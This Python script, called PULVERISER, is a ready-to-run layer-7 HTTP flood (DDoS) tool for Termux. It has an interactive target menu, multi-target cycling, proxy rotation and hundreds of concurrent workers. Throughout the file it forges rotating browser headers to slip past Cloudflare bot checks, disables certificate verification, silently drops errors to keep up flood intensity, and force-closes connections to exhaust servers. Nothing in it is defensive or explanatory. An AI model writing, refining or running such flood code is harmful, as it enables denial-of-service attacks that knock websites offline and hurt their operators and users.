#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PULVERISER - ASYNCHRONOUS LAYER 7 HTTP FLOOD WITH CLOUDFLARE BYPASS ATTEMPT
# TARGET MENU, MULTI-TARGET CYCLING, AGGRESSIVE CONCURRENCY, PROXY SUPPORT
# RUNS ON TERMUX (ANDROID) WITH PYTHON 3.8+ AND aiohttp

import asyncio
import aiohttp
import random
import time
import socket
import ssl
import sys
import os
from urllib.parse import urlparse

# ---------- CONFIGURATION ----------
CONCURRENT_CONNECTIONS = 500        # maximum simultaneous TCP connections
WORKER_TASKS = 200                  # number of asyncio tasks
REQUEST_TIMEOUT = 10               # seconds before dropping a slow connection
BURST_DURATION = 60                # attack burst length in seconds per target
RETRY_DELAY = 0.1                  # delay after a failed request
# -----------------------------------

# User-Agent list to randomize fingerprints and bypass basic Cloudflare checks
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
]

# Accept headers to mimic real browsers
ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
]

# Accept-Language values
ACCEPT_LANG = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
]

# ---------- GLOBAL STATE ----------
targets = []                # list of dicts: {'url':..., 'method':..., 'post_data':...}
proxy_list = []             # proxy URLs e.g. "http://user:pass@ip:port"
attack_running = False      # flag to stop/start flood
loop = None                 # asyncio event loop
session = None              # aiohttp.ClientSession (reused)
# -----------------------------------

def clear_screen():
    """Clear terminal."""
    os.system('cls' if os.name == 'nt' else 'clear')

def show_menu():
    """Display target management menu."""
    clear_screen()
    print("=== PULVERISER - CLOUDFLARE BYPASS DDoS ===")
    print(f" Targets loaded: {len(targets)}")
    for i, t in enumerate(targets):
        print(f"  [{i}] {t['method']} {t['url']}")
    print("\nCommands:")
    print("  add <url> [method=GET] [postdata]  - add target (method: GET/POST)")
    print("  addproxy <proxy_url>               - add proxy (http://ip:port)")
    print("  del <index>                         - remove target by index")
    print("  start                               - launch attack loop")
    print("  stop                                - stop all attacks")
    print("  clear                               - clear all targets")
    print("  exit                                - quit")
    print("===========================================")

def add_target(url, method="GET", post_data=None):
    """Add a target to the list."""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    parsed = urlparse(url)
    if not parsed.netloc:
        print("[!] Invalid URL")
        return
    targets.append({'url': url, 'method': method.upper(), 'post_data': post_data or ''})
    print(f"[+] Target added: {method.upper()} {url}")

def add_proxy(proxy_url):
    """Add a proxy to the list."""
    proxy_list.append(proxy_url)
    print(f"[+] Proxy added: {proxy_url}")

def del_target(index):
    """Remove target by index."""
    try:
        removed = targets.pop(int(index))
        print(f"[-] Removed: {removed['url']}")
    except (IndexError, ValueError):
        print("[!] Invalid index")

def clear_targets():
    """Remove all targets."""
    global targets
    targets = []
    print("[*] All targets cleared.")

# ---------- ATTACK CORE ----------
async def fetch(session, target, proxy=None):
    """Perform a single HTTP request with randomly forged headers."""
    url = target['url']
    method = target['method']
    post_data = target['post_data']

    # Build random headers to appear as different browsers
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(ACCEPT_HEADERS),
        "Accept-Language": random.choice(ACCEPT_LANG),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "DNT": "1",  # Do Not Track to appear legitimate
    }

    try:
        if method == "POST":
            async with session.post(url, data=post_data, headers=headers,
                                    proxy=proxy, timeout=REQUEST_TIMEOUT,
                                    ssl=False) as resp:
                # Read response to consume connection resources
                await resp.read()
        else:  # GET (also supports HEAD, but keep GET)
            async with session.get(url, headers=headers,
                                   proxy=proxy, timeout=REQUEST_TIMEOUT,
                                   ssl=False) as resp:
                await resp.read()
    except (asyncio.TimeoutError, aiohttp.ClientError, ssl.SSLError,
            ConnectionRefusedError, OSError) as e:
        # Silently ignore failures to maintain flood intensity
        pass
    except Exception:
        pass

async def flood_worker(target, proxy=None):
    """Continually send requests until attack_running becomes False."""
    while attack_running:
        await fetch(session, target, proxy)
        # Minimal delay to avoid completely saturating local event loop
        await asyncio.sleep(random.uniform(0, 0.01))

async def attack_coordinator(target_index):
    """Manage multiple workers against a single target."""
    target = targets[target_index]
    print(f"[*] Attacking {target['url']} with {WORKER_TASKS} workers "
          f"({BURST_DURATION}s burst) ...")
    # Select a proxy if available (round-robin per worker)
    proxy = random.choice(proxy_list) if proxy_list else None
    tasks = []
    for _ in range(WORKER_TASKS):
        tasks.append(asyncio.create_task(flood_worker(target, proxy)))
    # Run for the burst duration
    await asyncio.sleep(BURST_DURATION)
    # Cancel workers
    for t in tasks:
        t.cancel()
    print(f"[*] Burst finished for {target['url']}")

async def attack_loop():
    """Cycle through targets indefinitely while attack_running is True."""
    global session
    # Create a single session with connector tuned for high concurrency
    connector = aiohttp.TCPConnector(
        limit=CONCURRENT_CONNECTIONS,
        force_close=True,          # close connections immediately to hammer server
        enable_cleanup_closed=True,
        ssl=False,                 # ignore SSL to avoid certificate checks (bypass Cloudflare cert errors)
        ttl_dns_cache=10,          # short DNS TTL to handle changing IPs
    )
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
    session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    try:
        while attack_running and targets:
            for idx in range(len(targets)):
                if not attack_running:
                    break
                await attack_coordinator(idx)
                # Small pause between targets
                await asyncio.sleep(1)
    finally:
        await session.close()
        session = None

def start_attack():
    """Initiate attack loop in the event loop."""
    global attack_running, loop
    if not targets:
        print("[!] No targets added.")
        return
    if attack_running:
        print("[!] Attack already running.")
        return
    attack_running = True
    loop.create_task(attack_loop())
    print("[*] Attack started. Use 'stop' to halt.")

def stop_attack():
    """Gracefully stop the flood."""
    global attack_running
    if not attack_running:
        print("[!] No attack in progress.")
        return
    attack_running = False
    print("[*] Stopping attack... (may take a moment)")

# ---------- MAIN TERMINAL INTERFACE ----------
async def interactive_shell():
    """Async command interpreter."""
    global loop
    loop = asyncio.get_running_loop()
    while True:
        show_menu()
        cmd = input("> ").strip().split()
        if not cmd:
            continue
        action = cmd[0].lower()
        if action == "add":
            if len(cmd) < 2:
                print("Usage: add <url> [method=GET] [post_data]")
                continue
            url = cmd[1]
            method = cmd[2] if len(cmd) > 2 else "GET"
            post_data = cmd[3] if len(cmd) > 3 else None
            add_target(url, method, post_data)
        elif action == "addproxy":
            if len(cmd) < 2:
                print("Usage: addproxy <proxy_url>")
                continue
            add_proxy(cmd[1])
        elif action == "del":
            if len(cmd) < 2:
                print("Usage: del <index>")
                continue
            del_target(cmd[1])
        elif action == "clear":
            clear_targets()
        elif action == "start":
            start_attack()
        elif action == "stop":
            stop_attack()
        elif action == "exit":
            stop_attack()
            print("[*] Exiting...")
            await asyncio.sleep(0.5)
            # Cancel all pending tasks
            tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            sys.exit(0)
        else:
            print("[!] Unknown command.")
        await asyncio.sleep(0.1)

if __name__ == "__main__":
    # Ensure required library is installed (Termux: pip install aiohttp)
    try:
        import aiohttp
    except ImportError:
        print("[!] aiohttp missing. Install with: pip install aiohttp")
        sys.exit(1)
    asyncio.run(interactive_shell())
